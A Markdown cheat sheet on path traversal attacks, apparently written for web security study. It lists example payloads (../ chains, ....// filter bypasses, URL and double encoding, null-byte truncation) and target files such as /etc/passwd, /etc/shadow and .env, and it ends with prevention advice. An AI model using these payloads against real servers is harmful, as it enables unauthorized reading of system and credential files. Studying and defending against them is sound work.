<!--
 * This file is part of RS Cheat Sheets.
 *
 * RS Cheat Sheets is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * RS Cheat Sheets is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with RS Cheat Sheets. If not, see <https://www.gnu.org/licenses/>.
 */
-->

[Home](../README.md)

# Path Traversal/Directory Traversal
Path traversal attacks happen when the user can input file paths into parameters and retrieve sensitive files by doing so.

Ex: An application makes a request from the server `GET /image?filename=218.png` or loads an image `<img src="/loadImage?filename=218.png">`

If the application doesn't parse the filename correctly you could navigate the server's directories by changing the parameter.

Ex: `GET /image?filename=./file`

Since you don't know what directory the server is checking for you, you can continually try to navigate up the directories and check if your file is located there.

Ex: `GET /image?filename=../file`, `GET /image?filename=../../file`, `GET /image?filename=../../../file`, etc.
- Try 10 layers deep.

An application may require the filename to start with a specific path. Ex: `filename=/var/www/images/218.png`. It is recommended to start with that path and work your way up. Ex: `filename=/var/www/images/file`, `filename=/var/www/images/../file`, etc.

## Where to find path traversal attack vectors
- Images in the DOM are `/image?filename=218.png` or something similar
- Hover over image source and click full image link
	- This will open a new tab of just the image
	- This will show the GET request in Burp Suit

## Different ways of getting around directory parsing
- Use direct filepath
	- Ex: `/file`
- `....//` or `....\/` instead of the usual `../`
	- If the parsing just removes any `../`s or `..\`s
- Use url encoding or double url encoding
	- `%2f` instead of `/`
	- `%5c` instead of `\`
	- `%2e` instead of `.`
	- `%252f` outputs `%2f`
	- `%255c` outputs `%5c`
	- `%252e` outputs `%2e`
	- `%2e%2e%2f` url encoded
	- `%252e%252e%252f` double url encoded
	- Depending upon the encoding used
		- `..%c0%af` can output `../`
		- `..%ef%bc%8f` can output `../`
- You can use a null byte(`%00`) to remove the file extension
	- `./file%00.png`

## What files are common
- /etc/passwd
	- passwd contains details of the users registered on the server
- /etc/shadow
- /windows/win.ini
- .env

## Miscellaneous
- When making requests change the "Accept:" header to `*/*` to accept any file type

## Prevent file path traversal attacks
- Avoid passing user input into code that retrieves the file.
- Validate user input before processing it.
	- Should compare against a whitelist of permitted values.
	- Should only contain permitted characters(like alphanumeric characters).